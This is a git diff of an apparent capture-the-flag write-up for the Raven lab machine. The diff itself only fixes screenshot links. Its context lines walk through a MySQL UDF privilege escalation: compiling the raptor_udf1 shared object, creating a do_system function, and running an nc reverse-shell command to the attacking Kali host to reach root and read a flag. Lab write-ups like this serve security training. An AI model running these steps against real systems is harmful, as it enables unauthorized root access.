@@ -192,7 +192,7 @@ ps aux | root
 dpkg -l | grep mysql
 ```
 
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_mysql_credentials_CLEAN.jpg "MySQL Credentials")
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_mysql%20credentials_CLEAN.JPG "MySQL Credentials")
 
 Root again. For this UDF Privilege Escalation exploit to work, a command must be written in c code. The code is then compiled into a shared object which is similar to a library file. This si then read into the Database as raw binary. Because the MySQL service is running as Root, the data can be dumped into the correct directory for MySQL to use that command as an actual library. We can then create a function that uses that shared library & allows the attacking team to exploit it.
 
@@ -218,7 +218,7 @@ gcc -g -shared -Wl,-soname,raptor_udf1.so -o raptor_udf1.so raptor_udf1.c -lc -f
 chmod 777 raptor_udf1.so
 ```
 
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_compile.jpg "Compile the Exploit")
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_compile.JPG "Compile the Exploit")
 
 After launching into the MySQL program, the following steps must be taken. Create a table, read the file into the table, move the contents into a dumpfile, then create a function. Also, verify where the plugin library is because this can vary.
 
@@ -232,7 +232,7 @@ create function do_system returns integer soname 'raptor_udf1.so';
 select * from mysql.func;
 ```
 
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_building_mysql_exploit.jpg "Build the exploit in MySQL")
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_building_mysql_exploit.JPG "Build the exploit in MySQL")
 
 No errors. Time to run the exploit. Set up a listener on the Attacking Kali on port 4444 & ran the exploit in mysql
 
@@ -240,7 +240,7 @@ No errors. Time to run the exploit. Set up a listener on the Attacking Kali on p
 select do_system('nc 192.168.1.90 4444 -e /bin/bash &');
 ```
 
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_priv_esc.jpg "Attempt the exploit")
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_priv_esc.JPG "Attempt the exploit")
 
 Success! Now export a shell, locate & Read out Flag 4
 
@@ -251,7 +251,7 @@ cd /root && ls
 cat flag4.txt
 ```
 
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_root_shell_clean.jpg "Root shell & Flag 4")
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_root_shell_clean.JPG "Root shell & Flag 4")
 
 Confirmed root shell on both machines. However, due to the weak credentials previously found & the reuse of MySQL password, went to a lower shell & attempted to just switch to the root account. Was prompted for a password and unbelievably was able to guess the exact password.
 
